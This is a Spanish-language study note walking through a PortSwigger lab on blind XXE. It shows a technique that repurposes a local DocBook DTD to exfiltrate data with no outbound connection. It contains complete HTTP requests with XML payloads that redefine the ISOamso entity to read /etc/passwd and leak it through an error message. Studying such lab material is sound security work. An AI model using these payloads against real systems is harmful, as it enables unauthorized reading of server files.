---
aliases:
  - XXE ciego - reutilizar DTD local
  - blind xxe local dtd
  - repurpose local dtd docbookx
tags:
  - vuln/xxe
  - example
  - portswigger
---

# Ejemplo — XXE ciego: reutilizar un DTD local (sin salida a internet)

> Lab: [Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd) · **Expert** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

**Qué demuestra:** el peor caso. La petición **no devuelve** el resultado **y** no hay salida OAST (no podés cargar un DTD externo porque el server **no sale a internet**). Truco: cargar un **DTD que ya existe en el disco** del server y **redefinir una de sus entidades** para inyectar el ataque error-based — **todo local**.

## Vector completo

### 1. Encontrar un DTD local (paso previo)
Confirmás que existe un DTD conocido cargándolo solo. El estándar es el de GNOME **`yelp`**:
```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
Si la respuesta **no** da error de "archivo no encontrado" → el DTD existe → seguí.

### 2. El ataque — redefinir una entidad del DTD local
En `docbookx.dtd` existe la entidad de parámetro `ISOamso`. La **redefinís** para meter el error-based:
```http
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Verificación
La respuesta trae el `FileNotFoundException` con el contenido de `/etc/passwd` embebido (igual que el [[vulnerabilities/006-xxe/examples/xxe-ciego-error-based-con-dtd-externo|error-based]], pero sin server externo).

## Detalles que se pasan por alto
- **`ISOamso` debe ser una entidad que exista DENTRO de `docbookx.dtd`.** Al cargar el DTD local, tu redefinición gana y dispara el ataque. Si usás otro DTD local, tenés que redefinir una entidad **suya**.
- **Escapado doble:** dentro de un valor de entidad que a su vez declara entidades, `%` = `&#x25;` y `&` = `&#x26;`. Por eso aparece `&#x26;#x25;` (un `%` doblemente escapado) y `&#x27;` (comilla simple).
- **No usa exploit server ni Collaborator** — es la gracia: funciona con el server **aislado de internet**.
- Rutas alternativas de DTD locales existen; `docbookx.dtd` es el candidato estándar de PortSwigger por venir con el paquete `yelp`.
